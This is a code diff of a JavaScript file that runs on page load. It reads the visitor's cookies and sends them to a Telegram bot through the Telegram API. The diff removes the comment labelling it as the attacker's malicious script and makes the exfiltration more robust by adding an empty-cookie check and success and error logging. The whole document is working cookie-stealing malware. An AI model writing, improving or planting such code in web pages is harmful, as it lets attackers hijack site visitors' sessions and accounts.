@@ -1,4 +1,3 @@
-// Attacker's malicious JavaScript
 document.addEventListener('DOMContentLoaded', () => {
     console.log('Website loaded!');
 
@@ -17,16 +16,20 @@ document.addEventListener('DOMContentLoaded', () => {
     var chatId = "899184398";
 
     // Get victim's cookies
-    var stolenCookies = document.cookie;
+    var stolenCookies = document.cookie;  // Now correctly fetching cookies
 
-    // Send cookies to attacker's Telegram
-    var telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage";
-    var message = "Stolen Cookies: " + stolenCookies;
+    // Check if there are cookies to send
+    if (stolenCookies) {
+        var telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage";
+        var message = "Stolen Cookies: " + stolenCookies;  // Properly concatenating
 
-    fetch(telegramUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: message })
-    });
-
+        fetch(telegramUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: message })
+        }).then(response => console.log("Cookies sent!"))
+          .catch(error => console.error("Error sending cookies:", error));
+    } else {
+        console.log("No cookies to steal!");
+    }
 });
